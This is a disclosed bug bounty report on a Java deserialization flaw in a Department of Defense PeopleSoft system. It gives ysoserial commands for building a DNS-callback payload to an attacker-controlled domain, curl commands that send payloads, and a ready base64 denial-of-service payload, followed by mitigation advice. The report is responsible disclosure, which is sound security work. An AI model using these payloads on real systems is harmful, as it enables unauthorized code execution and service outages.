# Remote Code Execution (RCE) in a DoD website

## Report Details
- **Report ID**: 329399
- **URL**: https://hackerone.com/reports/329399
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-03-24T02:59:09.459Z
- **Disclosed**: 2019-10-08T18:50:55.421Z

## Reporter
- **Username**: joaomatosf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
SUMMARY:
====================

The DoD **`https://███/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://█████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:29:54.523 queries: info: client ███#5691: query: dod.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://██████████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

## Attachments
No attachments
